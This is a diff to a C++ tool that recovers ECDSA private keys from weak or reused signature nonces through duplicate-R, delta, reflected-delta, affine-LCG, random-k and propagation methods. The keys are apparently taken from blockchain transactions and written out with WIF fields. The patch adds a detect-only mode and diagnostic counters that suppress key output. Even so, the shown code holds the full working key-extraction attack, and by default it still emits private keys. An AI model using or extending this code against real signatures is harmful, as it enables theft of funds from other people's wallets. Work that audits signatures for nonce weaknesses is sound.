@@ -474,6 +474,55 @@ struct OutputSink {
 
 static OutputSink GOUT;
 static mutex GLOG_M;
+static bool G_DETECT_ONLY = false;
+
+struct DiagStats {
+    atomic<size_t> private_output_suppressed{0};
+    atomic<size_t> k_output_suppressed{0};
+
+    atomic<size_t> primary_pairs{0};
+    atomic<size_t> primary_denom_zero{0};
+    atomic<size_t> primary_inverse_fail{0};
+    atomic<size_t> primary_k_zero{0};
+    atomic<size_t> primary_r_from_k_mismatch{0};
+    atomic<size_t> primary_ecdsa_fail{0};
+    atomic<size_t> primary_pubkey_mismatch{0};
+    atomic<size_t> primary_valid_candidates{0};
+
+    atomic<size_t> delta_candidates{0};
+    atomic<size_t> delta_ecdsa_fail{0};
+    atomic<size_t> delta_r_from_k_mismatch{0};
+    atomic<size_t> delta_pubkey_mismatch{0};
+    atomic<size_t> delta_valid_candidates{0};
+
+    atomic<size_t> reflected_candidates{0};
+    atomic<size_t> reflected_relation_fail{0};
+    atomic<size_t> reflected_ecdsa_fail{0};
+    atomic<size_t> reflected_r_from_k_mismatch{0};
+    atomic<size_t> reflected_pubkey_mismatch{0};
+    atomic<size_t> reflected_valid_candidates{0};
+
+    atomic<size_t> lcg_candidates{0};
+    atomic<size_t> lcg_denom_zero{0};
+    atomic<size_t> lcg_inverse_fail{0};
+    atomic<size_t> lcg_ecdsa_fail{0};
+    atomic<size_t> lcg_r_from_k_mismatch{0};
+    atomic<size_t> lcg_pubkey_mismatch{0};
+    atomic<size_t> lcg_valid_candidates{0};
+
+    atomic<size_t> propagate_known_priv_rows{0};
+    atomic<size_t> propagate_known_k_rows{0};
+    atomic<size_t> propagate_r_from_k_mismatch{0};
+    atomic<size_t> propagate_pubkey_mismatch{0};
+    atomic<size_t> propagate_valid_candidates{0};
+
+    atomic<size_t> random_candidates{0};
+    atomic<size_t> random_r_from_k_mismatch{0};
+    atomic<size_t> random_pubkey_mismatch{0};
+    atomic<size_t> random_valid_candidates{0};
+};
+
+static DiagStats GDIAG;
 
 static void log_line(const string& s){
     lock_guard<mutex> lk(GLOG_M);
@@ -498,48 +547,57 @@ static int try_primary_dupR(Ctx& C, Secp& S, const vector<Row>& rows,
         for(int a=0;a<(int)idxs.size();++a){
             for(int b=a+1;b<(int)idxs.size();++b){
                 pairs_tested++;
+                GDIAG.primary_pairs++;
                 const Row& R1 = rows[idxs[a]];
                 const Row& R2 = rows[idxs[b]];
                 for(int path=0;path<2;path++){
                     if(path==0) BN_mod_sub(denom.n,R1.s.n,R2.s.n,C.N,C.ctx);
                     else        BN_mod_add(denom.n,R1.s.n,R2.s.n,C.N,C.ctx);
-                    if(BN_is_zero(denom.n)) continue;
-                    if(!bn_invm(C, denom.n, denom.n)) continue;
+                    if(BN_is_zero(denom.n)){ GDIAG.primary_denom_zero++; continue; }
+                    if(!bn_invm(C, denom.n, denom.n)){ GDIAG.primary_inverse_fail++; continue; }
                     BN_mod_sub(k.n,R1.z.n,R2.z.n,C.N,C.ctx);
                     bn_mulm(C, k.n, denom.n, k.n);
-                    if(BN_is_zero(k.n)) continue;
+                    if(BN_is_zero(k.n)){ GDIAG.primary_k_zero++; continue; }
 
                     // r-from-k verification
-                    if(!r_from_k_matches(C, S, R1.r_hex, k.n)) continue;
+                    if(!r_from_k_matches(C, S, R1.r_hex, k.n)){ GDIAG.primary_r_from_k_mismatch++; continue; }
                     if(path==0) BN_copy(k2.n, k.n);
                     else        BN_mod_sub(k2.n, C.N, k.n, C.N, C.ctx);
-                    if(BN_is_zero(k2.n)) continue;
+                    if(BN_is_zero(k2.n)){ GDIAG.primary_k_zero++; continue; }
 
                     if(!bn_invm(C, R1.r.n, rinv.n)) continue;
                     BN_mod_mul(tmp.n, R1.s.n, k.n, C.N, C.ctx);
                     BN_mod_sub(tmp.n, tmp.n, R1.z.n, C.N, C.ctx);
                     bn_mulm(C, tmp.n, rinv.n, tmp.n); // tmp=d
-                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, tmp.n, k.n, chk1, chk2)) continue;
-                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, tmp.n, k2.n, chk1, chk2)) continue;
+                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, tmp.n, k.n, chk1, chk2)){ GDIAG.primary_ecdsa_fail++; continue; }
+                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, tmp.n, k2.n, chk1, chk2)){ GDIAG.primary_ecdsa_fail++; continue; }
                     string dhex = bn_hex(tmp.n);
                     auto pubs = S.pub_from_priv_bn(dhex);
                     if(R1.pub==pubs.first || R1.pub==pubs.second){
-                        store.add_priv(R1.pub, dhex);
-                        GOUT.emit_unique_key(
-                            out_json,
-                            out_txt,
-                            R1.pub,
-                            dhex,
-                            string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
-                            "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R1.r_hex + "\",\"method\":\"primary\"}",
-                            string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                            " R=" + R1.r_hex + " (primary)"
-                        );
+                        GDIAG.primary_valid_candidates++;
                         string khex=bn_hex(k.n);
-                        store.add_k(R1.r_hex, khex);
                         BNWrap nk; BN_mod_sub(nk.n, C.N, k.n, C.N, C.ctx);
-                        store.add_k(R1.r_hex, bn_hex(nk.n));
+                        if(G_DETECT_ONLY){
+                            GDIAG.private_output_suppressed++;
+                            GDIAG.k_output_suppressed += 2;
+                        }else{
+                            store.add_priv(R1.pub, dhex);
+                            GOUT.emit_unique_key(
+                                out_json,
+                                out_txt,
+                                R1.pub,
+                                dhex,
+                                string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
+                                "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R1.r_hex + "\",\"method\":\"primary\"}",
+                                string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                                " R=" + R1.r_hex + " (primary)"
+                            );
+                            store.add_k(R1.r_hex, khex);
+                            store.add_k(R1.r_hex, bn_hex(nk.n));
+                        }
                         found++;
+                    }else{
+                        GDIAG.primary_pubkey_mismatch++;
                     }
                 }
             }
@@ -604,52 +662,59 @@ static int delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                 int tried=0; bool found=false;
                 auto try_delta = [&](uint64_t del){
                     tried++;
+                    GDIAG.delta_candidates++;
                     BN_set_word(delta.n, del);
                     BN_mod_mul(d.n, P.alpha.n, delta.n, C.N, C.ctx);
                     BN_mod_add(d.n, d.n, P.beta.n, C.N, C.ctx);
                     BN_mod_mul(k1.n, P.u.n, delta.n, C.N, C.ctx);
                     BN_mod_add(k1.n, k1.n, P.v.n, C.N, C.ctx);
                     BN_mod_add(k2.n, k1.n, delta.n, C.N, C.ctx);
-                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
-                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;
+                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)){ GDIAG.delta_ecdsa_fail++; return false; }
+                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)){ GDIAG.delta_ecdsa_fail++; return false; }
 
                     // r-from-k check ორივეზე
-                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
-                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;
+                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)){ GDIAG.delta_r_from_k_mismatch++; return false; }
+                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)){ GDIAG.delta_r_from_k_mismatch++; return false; }
 
                     string pub_out;
                     string dhex = bn_hex(d.n);
                     if(!nopub){
                         auto pubs = S.pub_from_priv_bn(dhex);
-                        if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;
+                        if(R1.pub!=pubs.first && R1.pub!=pubs.second){ GDIAG.delta_pubkey_mismatch++; return false; }
                         pub_out = R1.pub;
                     }else{
                         pub_out = S.pub_from_priv_bn(dhex).first;
                     }
-                    store.add_priv(pub_out, dhex);
-                    GOUT.emit_unique_key(
-                        out_json,
-                        out_txt,
-                        pub_out,
-                        dhex,
-                        string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
-                        "\"," + wif_json_fields(dhex) + ",\"method\":\"delta\",\"delta\":\"" + bn_hex(delta.n) + "\"}",
-                        string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
-                        " (delta=" + bn_hex(delta.n) + ")"
-                    );
-                    ofstream(out_delta, ios::app)
-                        << "{\"pubkey\":\""<<pub_out<<"\",\"delta_hex\":\""<<bn_hex(delta.n)<<"\","
-                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
-                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
-                        << "\"why\":\"gradient/step\"}\n";
+                    GDIAG.delta_valid_candidates++;
                     string k1h = bn_hex(k1.n);
                     string k2h = bn_hex(k2.n);
-                    store.add_k(R1.r_hex, k1h);
-                    store.add_k(R2.r_hex, k2h);
                     BNWrap nk;
-                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
-                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    if(G_DETECT_ONLY){
+                        GDIAG.private_output_suppressed++;
+                        GDIAG.k_output_suppressed += 4;
+                    }else{
+                        store.add_priv(pub_out, dhex);
+                        GOUT.emit_unique_key(
+                            out_json,
+                            out_txt,
+                            pub_out,
+                            dhex,
+                            string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
+                            "\"," + wif_json_fields(dhex) + ",\"method\":\"delta\",\"delta\":\"" + bn_hex(delta.n) + "\"}",
+                            string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                            " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
+                            " (delta=" + bn_hex(delta.n) + ")"
+                        );
+                        ofstream(out_delta, ios::app)
+                            << "{\"pubkey\":\""<<pub_out<<"\",\"delta_hex\":\""<<bn_hex(delta.n)<<"\","
+                            << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
+                            << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
+                            << "\"why\":\"gradient/step\"}\n";
+                        store.add_k(R1.r_hex, k1h);
+                        store.add_k(R2.r_hex, k2h);
+                        BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
+                        BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    }
                     hits++; found=true; return true;
                 };
                 for(uint64_t del: gradient){
@@ -711,6 +776,7 @@ static int reflected_delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                 int tried=0; bool found=false;
                 auto try_signed_delta = [&](int64_t del)->bool{
                     tried++;
+                    GDIAG.reflected_candidates++;
                     bn_set_int64_mod(C, del, delta.n);
 
                     BN_mod_sub(d.n, delta.n, sumB.n, C.N, C.ctx);
@@ -722,47 +788,53 @@ static int reflected_delta_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                     BN_mod_add(k2.n, k2.n, R2.B.n, C.N, C.ctx);
 
                     BN_mod_add(ksum.n, k1.n, k2.n, C.N, C.ctx);
-                    if(BN_cmp(ksum.n, delta.n) != 0) return false;
+                    if(BN_cmp(ksum.n, delta.n) != 0){ GDIAG.reflected_relation_fail++; return false; }
 
-                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
-                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;
-                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
-                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;
+                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)){ GDIAG.reflected_ecdsa_fail++; return false; }
+                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)){ GDIAG.reflected_ecdsa_fail++; return false; }
+                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)){ GDIAG.reflected_r_from_k_mismatch++; return false; }
+                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)){ GDIAG.reflected_r_from_k_mismatch++; return false; }
 
                     string pub_out;
                     string dhex = bn_hex(d.n);
                     if(!nopub){
                         auto pubs = S.pub_from_priv_bn(dhex);
-                        if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;
+                        if(R1.pub!=pubs.first && R1.pub!=pubs.second){ GDIAG.reflected_pubkey_mismatch++; return false; }
                         pub_out = R1.pub;
                     }else{
                         pub_out = S.pub_from_priv_bn(dhex).first;
                     }
 
-                    store.add_priv(pub_out, dhex);
-                    GOUT.emit_unique_key(
-                        out_json,
-                        out_txt,
-                        pub_out,
-                        dhex,
-                        string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
-                        "\"," + wif_json_fields(dhex) + ",\"method\":\"reflected-delta\",\"delta\":\"" +
-                        bn_hex(delta.n) + "\",\"delta_signed\":\"" + to_string(del) + "\"}",
-                        string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
-                        " (reflected-delta=" + to_string(del) + ")"
-                    );
-                    ofstream(out_delta, ios::app)
-                        << "{\"pubkey\":\""<<pub_out<<"\",\"why\":\"reflected-delta\","
-                        << "\"delta\":\""<<bn_hex(delta.n)<<"\",\"delta_signed\":\""<<del<<"\","
-                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
-                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}]}\n";
-
-                    store.add_k(R1.r_hex, bn_hex(k1.n));
-                    store.add_k(R2.r_hex, bn_hex(k2.n));
+                    GDIAG.reflected_valid_candidates++;
                     BNWrap nk;
-                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
-                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    if(G_DETECT_ONLY){
+                        GDIAG.private_output_suppressed++;
+                        GDIAG.k_output_suppressed += 4;
+                    }else{
+                        store.add_priv(pub_out, dhex);
+                        GOUT.emit_unique_key(
+                            out_json,
+                            out_txt,
+                            pub_out,
+                            dhex,
+                            string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
+                            "\"," + wif_json_fields(dhex) + ",\"method\":\"reflected-delta\",\"delta\":\"" +
+                            bn_hex(delta.n) + "\",\"delta_signed\":\"" + to_string(del) + "\"}",
+                            string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                            " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
+                            " (reflected-delta=" + to_string(del) + ")"
+                        );
+                        ofstream(out_delta, ios::app)
+                            << "{\"pubkey\":\""<<pub_out<<"\",\"why\":\"reflected-delta\","
+                            << "\"delta\":\""<<bn_hex(delta.n)<<"\",\"delta_signed\":\""<<del<<"\","
+                            << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
+                            << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}]}\n";
+
+                        store.add_k(R1.r_hex, bn_hex(k1.n));
+                        store.add_k(R2.r_hex, bn_hex(k2.n));
+                        BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
+                        BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    }
                     hits++; found=true; return true;
                 };
 
@@ -830,6 +902,7 @@ static int lcg_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
 
                 auto try_ab = [&](long long da, long long bb)->bool{
                     tried++;
+                    GDIAG.lcg_candidates++;
                     // a = 1 + da  (mod n)
                     if(da>=0){
                         BN_set_word(a_bn.n, (BN_ULONG)da);
@@ -844,8 +917,8 @@ static int lcg_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                     // denom = s2^{-1} r2 - a*s1^{-1} r1
                     BN_mod_mul(denom.n, a_bn.n, s1inv_r1.n, C.N, C.ctx);
                     BN_mod_sub(denom.n, s2inv_r2.n, denom.n, C.N, C.ctx);
-                    if(BN_is_zero(denom.n)) return false;
-                    if(!bn_invm(C, denom.n, denom_inv.n)) return false;
+                    if(BN_is_zero(denom.n)){ GDIAG.lcg_denom_zero++; return false; }
+                    if(!bn_invm(C, denom.n, denom_inv.n)){ GDIAG.lcg_inverse_fail++; return false; }
 
                     // num = b + a*s1^{-1} z1 - s2^{-1} z2
                     BN_mod_mul(num.n, a_bn.n, s1inv_z1.n, C.N, C.ctx);
@@ -865,40 +938,45 @@ static int lcg_scan_bucket(Ctx& C, Secp& S, const vector<Row>& rows,
                     BN_mod_mul(k2.n, k2.n, R2.s_inv.n, C.N, C.ctx);
 
                     // ორი სიგნატურის სრული ვერიფიკაცია + r-from-k
-                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)) return false;
-                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)) return false;
-                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)) return false;
-                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)) return false;
+                    if(!ecdsa_ok(C, R1.s.n, R1.z.n, R1.r.n, d.n, k1.n, tmp1, tmp2)){ GDIAG.lcg_ecdsa_fail++; return false; }
+                    if(!ecdsa_ok(C, R2.s.n, R2.z.n, R2.r.n, d.n, k2.n, tmp1, tmp2)){ GDIAG.lcg_ecdsa_fail++; return false; }
+                    if(!r_from_k_matches(C, S, R1.r_hex, k1.n)){ GDIAG.lcg_r_from_k_mismatch++; return false; }
+                    if(!r_from_k_matches(C, S, R2.r_hex, k2.n)){ GDIAG.lcg_r_from_k_mismatch++; return false; }
 
                     string dhex = bn_hex(d.n);
                     auto pubs = S.pub_from_priv_bn(dhex);
-                    if(R1.pub!=pubs.first && R1.pub!=pubs.second) return false;
+                    if(R1.pub!=pubs.first && R1.pub!=pubs.second){ GDIAG.lcg_pubkey_mismatch++; return false; }
 
-                    store.add_priv(R1.pub, dhex);
-                    GOUT.emit_unique_key(
-                        out_json,
-                        out_txt,
-                        R1.pub,
-                        dhex,
-                        string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
-                        "\"," + wif_json_fields(dhex) + ",\"method\":\"affine-lcg\",\"a\":\"" +
-                        bn_hex(a_bn.n) + "\",\"b\":\"" + bn_hex(b_bn.n) + "\"}",
-                        string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                        " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
-                        " (affine-lcg a=" + bn_hex(a_bn.n) + ", b=" + bn_hex(b_bn.n) + ")"
-                    );
-                    ofstream(out_delta, ios::app)
-                        << "{\"pubkey\":\""<<R1.pub<<"\",\"why\":\"affine-lcg\","
-                        << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
-                        << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
-                        << "\"a\":\""<<bn_hex(a_bn.n)<<"\",\"b\":\""<<bn_hex(b_bn.n)<<"\"}\n";
-
-                    // seed r->k ორივესთვის + (n-k)
-                    store.add_k(R1.r_hex, bn_hex(k1.n));
-                    store.add_k(R2.r_hex, bn_hex(k2.n));
+                    GDIAG.lcg_valid_candidates++;
                     BNWrap nk;
-                    BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
-                    BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    if(G_DETECT_ONLY){
+                        GDIAG.private_output_suppressed++;
+                        GDIAG.k_output_suppressed += 4;
+                    }else{
+                        store.add_priv(R1.pub, dhex);
+                        GOUT.emit_unique_key(
+                            out_json,
+                            out_txt,
+                            R1.pub,
+                            dhex,
+                            string("{\"pubkey\":\"") + R1.pub + "\",\"priv_hex\":\"" + dhex +
+                            "\"," + wif_json_fields(dhex) + ",\"method\":\"affine-lcg\",\"a\":\"" +
+                            bn_hex(a_bn.n) + "\",\"b\":\"" + bn_hex(b_bn.n) + "\"}",
+                            string("PUB=") + R1.pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                            " via " + R1.txid + ":" + to_string(R1.vin) + " & " + R2.txid + ":" + to_string(R2.vin) +
+                            " (affine-lcg a=" + bn_hex(a_bn.n) + ", b=" + bn_hex(b_bn.n) + ")"
+                        );
+                        ofstream(out_delta, ios::app)
+                            << "{\"pubkey\":\""<<R1.pub<<"\",\"why\":\"affine-lcg\","
+                            << "\"pair\":[{\"r\":\""<<R1.r_hex<<"\",\"s\":\""<<R1.s_hex<<"\",\"z\":\""<<R1.z_hex<<"\"},"
+                            << "{\"r\":\""<<R2.r_hex<<"\",\"s\":\""<<R2.s_hex<<"\",\"z\":\""<<R2.z_hex<<"\"}],"
+                            << "\"a\":\""<<bn_hex(a_bn.n)<<"\",\"b\":\""<<bn_hex(b_bn.n)<<"\"}\n";
+
+                        store.add_k(R1.r_hex, bn_hex(k1.n));
+                        store.add_k(R2.r_hex, bn_hex(k2.n));
+                        BN_mod_sub(nk.n, C.N, k1.n, C.N, C.ctx); store.add_k(R1.r_hex, bn_hex(nk.n));
+                        BN_mod_sub(nk.n, C.N, k2.n, C.N, C.ctx); store.add_k(R2.r_hex, bn_hex(nk.n));
+                    }
                     hits++; return true;
                 };
 
@@ -926,23 +1004,29 @@ static pair<int,int> propagate_on_bucket(Ctx& C, Secp& S,
     for(const Row& R: rows){
         string priv;
         if(!R.pub.empty() && store.get_priv_pub(R.pub, priv)){
+            GDIAG.propagate_known_priv_rows++;
             BN_hex2bn(&d.n, priv.c_str());
             BN_mod_mul(tmp.n, R.r.n, d.n, C.N, C.ctx);
             BN_mod_add(tmp.n, tmp.n, R.z.n, C.N, C.ctx);
             BN_mod_mul(k.n, tmp.n, R.s_inv.n, C.N, C.ctx);
 
             // r-from-k check
-            if(!r_from_k_matches(C, S, R.r_hex, k.n)) continue;
+            if(!r_from_k_matches(C, S, R.r_hex, k.n)){ GDIAG.propagate_r_from_k_mismatch++; continue; }
 
             string khex=bn_hex(k.n);
-            if(store.add_k(R.r_hex, khex)) new_k++;
             BNWrap nk;
             BN_mod_sub(nk.n, C.N, k.n, C.N, C.ctx);
-            if(store.add_k(R.r_hex, bn_hex(nk.n))) new_k++;
+            if(G_DETECT_ONLY){
+                GDIAG.k_output_suppressed += 2;
+            }else{
+                if(store.add_k(R.r_hex, khex)) new_k++;
+                if(store.add_k(R.r_hex, bn_hex(nk.n))) new_k++;
+            }
         }
         vector<string> ks;
         if(store.get_kset(R.r_hex, ks) && !ks.empty()){
             for(const string& khex: ks){
+                GDIAG.propagate_known_k_rows++;
                 BN_hex2bn(&k.n, khex.c_str());
                 if(!bn_invm(C, R.r.n, rinv.n)) continue;
                 BN_mod_mul(tmp.n, R.s.n, k.n, C.N, C.ctx);
@@ -952,24 +1036,29 @@ static pair<int,int> propagate_on_bucket(Ctx& C, Secp& S,
                 if(!ecdsa_ok(C, R.s.n, R.z.n, R.r.n, d.n, k.n, t1, t2)) continue;
 
                 // r-from-k check
-                if(!r_from_k_matches(C, S, R.r_hex, k.n)) continue;
+                if(!r_from_k_matches(C, S, R.r_hex, k.n)){ GDIAG.propagate_r_from_k_mismatch++; continue; }
 
                 string dhex = bn_hex(d.n);
                 auto pubs = S.pub_from_priv_bn(dhex);
                 string pub_out = !R.pub.empty()? R.pub : pubs.first;
-                if(!R.pub.empty() && R.pub!=pubs.first && R.pub!=pubs.second) continue;
-                bool new_priv = store.add_priv(pub_out, dhex);
-                bool emitted = GOUT.emit_unique_key(
-                    out_json,
-                    out_txt,
-                    pub_out,
-                    dhex,
-                    string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
-                    "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R.r_hex + "\",\"method\":\"propagate\"}",
-                    string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                    " R=" + R.r_hex + " (propagate)"
-                );
-                if(new_priv || emitted) new_d++;
+                if(!R.pub.empty() && R.pub!=pubs.first && R.pub!=pubs.second){ GDIAG.propagate_pubkey_mismatch++; continue; }
+                GDIAG.propagate_valid_candidates++;
+                if(G_DETECT_ONLY){
+                    GDIAG.private_output_suppressed++;
+                }else{
+                    bool new_priv = store.add_priv(pub_out, dhex);
+                    bool emitted = GOUT.emit_unique_key(
+                        out_json,
+                        out_txt,
+                        pub_out,
+                        dhex,
+                        string("{\"pubkey\":\"") + pub_out + "\",\"priv_hex\":\"" + dhex +
+                        "\"," + wif_json_fields(dhex) + ",\"r\":\"" + R.r_hex + "\",\"method\":\"propagate\"}",
+                        string("PUB=") + pub_out + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                        " R=" + R.r_hex + " (propagate)"
+                    );
+                    if(new_priv || emitted) new_d++;
+                }
             }
         }
     }
@@ -1034,6 +1123,7 @@ static int randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
                 bn_mod(Ct, k.n);
                 if(BN_is_zero(k.n)) continue;
                 for(const Row* pr: vec){
+                    GDIAG.random_candidates++;
                     if(!bn_invm(Ct, pr->r.n, rinv.n)) continue;
                     BN_mod_mul(tmp.n, pr->s.n, k.n, Ct.N, Ct.ctx);
                     BN_mod_sub(tmp.n, tmp.n, pr->z.n, Ct.N, Ct.ctx);
@@ -1041,26 +1131,34 @@ static int randk_scan_bucket(Ctx& C, const vector<Row>& rows, RecStore& store,
                     BNWrap t1,t2;
                     if(!ecdsa_ok(Ct, pr->s.n, pr->z.n, pr->r.n, d.n, k.n, t1,t2)) continue;
                     // r-from-k check
-                    if(!r_from_k_matches(Ct, Slocal, pr->r_hex, k.n)) continue;
+                    if(!r_from_k_matches(Ct, Slocal, pr->r_hex, k.n)){ GDIAG.random_r_from_k_mismatch++; continue; }
 
                     string dhex = bn_hex(d.n);
                     if(!pr->pub.empty()){
                         auto pubs = Slocal.pub_from_priv_bn(dhex);
-                        if(pr->pub!=pubs.first && pr->pub!=pubs.second) continue;
-                        store.add_priv(pr->pub, dhex);
-                        GOUT.emit_unique_key(
-                            out_json,
-                            out_txt,
-                            pr->pub,
-                            dhex,
-                            string("{\"pubkey\":\"") + pr->pub + "\",\"priv_hex\":\"" + dhex +
-                            "\"," + wif_json_fields(dhex) + ",\"r\":\"" + pr->r_hex + "\",\"method\":\"random-k\"}",
-                            string("PUB=") + pr->pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
-                            " R=" + pr->r_hex + " (random-k)"
-                        );
+                        if(pr->pub!=pubs.first && pr->pub!=pubs.second){ GDIAG.random_pubkey_mismatch++; continue; }
+                        GDIAG.random_valid_candidates++;
+                        if(G_DETECT_ONLY){
+                            GDIAG.private_output_suppressed++;
+                            GDIAG.k_output_suppressed += 2;
+                        }else{
+                            store.add_priv(pr->pub, dhex);
+                            GOUT.emit_unique_key(
+                                out_json,
+                                out_txt,
+                                pr->pub,
+                                dhex,
+                                string("{\"pubkey\":\"") + pr->pub + "\",\"priv_hex\":\"" + dhex +
+                                "\"," + wif_json_fields(dhex) + ",\"r\":\"" + pr->r_hex + "\",\"method\":\"random-k\"}",
+                                string("PUB=") + pr->pub + " PRIV=" + dhex + " " + wif_txt_fields(dhex) +
+                                " R=" + pr->r_hex + " (random-k)"
+                            );
+                        }
                     }
-                    store.add_k(pr->r_hex, bn_hex(k.n));
-                    BNWrap nk; BN_mod_sub(nk.n, Ct.N, k.n, Ct.N, Ct.ctx); store.add_k(pr->r_hex, bn_hex(nk.n));
+                    if(!G_DETECT_ONLY){
+                        store.add_k(pr->r_hex, bn_hex(k.n));
+                        BNWrap nk; BN_mod_sub(nk.n, Ct.N, k.n, Ct.N, Ct.ctx); store.add_k(pr->r_hex, bn_hex(nk.n));
+                    }
